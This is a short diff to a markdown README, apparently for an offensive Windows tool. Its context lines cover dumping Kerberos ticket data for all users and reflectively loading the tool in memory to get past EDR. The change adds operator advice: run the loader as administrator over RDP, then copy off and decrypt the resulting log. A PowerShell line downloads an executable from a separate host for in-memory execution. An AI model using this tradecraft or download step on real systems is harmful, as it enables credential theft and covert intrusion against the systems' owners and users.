@@ -49,7 +49,7 @@ Action: Dump Kerberos Ticket Data (All Users)
 ### Reflectively Loading
 
 > [!TIP]
-> You may or may not want to do this depending on the environment and EDR you're up against.
+> You may or may not want to do this depending on the environment and EDR you're up against. Ideal usage is connecting over RDP, right click on loader -> run as administrator -> copy the log file off and decrypt.
 
 ```
 $bytes = (Invoke-WebRequest -Uri 'http://192.168.0.250/trap_hospitality.exe' -UseBasicParsing).Content
